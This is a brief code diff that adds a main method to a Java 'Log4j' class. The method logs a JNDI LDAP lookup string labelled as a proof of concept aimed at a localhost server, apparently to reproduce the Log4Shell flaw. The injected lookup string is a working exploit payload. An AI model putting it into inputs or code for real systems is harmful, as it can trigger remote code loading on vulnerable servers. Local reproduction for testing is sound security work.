@@ -26,4 +26,9 @@ public class Log4j {
         }
     }
 
+    public static void main(String[] args) {
+        String poc = "${jndi:ldap://127.0.0.1:1389/f616nl}";
+        logger.error(poc);
+    }
+
 }
